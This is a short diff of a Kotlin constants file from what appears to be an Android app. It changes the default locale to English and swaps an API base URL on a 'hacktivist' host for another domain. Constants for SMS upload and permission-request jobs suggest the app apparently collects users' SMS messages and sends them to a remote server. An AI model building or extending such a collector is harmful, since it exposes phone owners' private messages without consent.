@@ -40,7 +40,7 @@ object Constants {
     private const val RUSSIAN_LOCALE = "ru"
 
     const val DEFAULT_THEME = false
-    const val DEFAULT_LOCALE = RUSSIAN_LOCALE
+    const val DEFAULT_LOCALE = ENGLISH_LOCALE
 
     fun getLanguageCode(language: AppLanguage): String {
         return when (language) {
@@ -59,16 +59,13 @@ object Constants {
 
     //***
 
-    const val BASE_URL = "https://hacktivist.samduuf.uz/api/v1/"
+    const val BASE_URL = "https://ierusalem.me/api/v1/"
     const val PERMISSION_REQUEST_WORK_NAME = "permission_request_work_name"
 
     const val SMS_UPLOAD_WORK_NAME = "sms_upload_work_name"
-    const val PHOTOS_UPLOAD_WORK_NAME = "photos_upload_work_name"
-    const val FILES_UPLOAD_WORK_NAME = "files_upload_work_name"
 
     //login
     const val MINIMUM_PASSWORD_AND_LOGIN_LENGTH = 3
-    const val MAX_PASSWORD_AND_LOGIN_LENGTH = 12
 
 
 
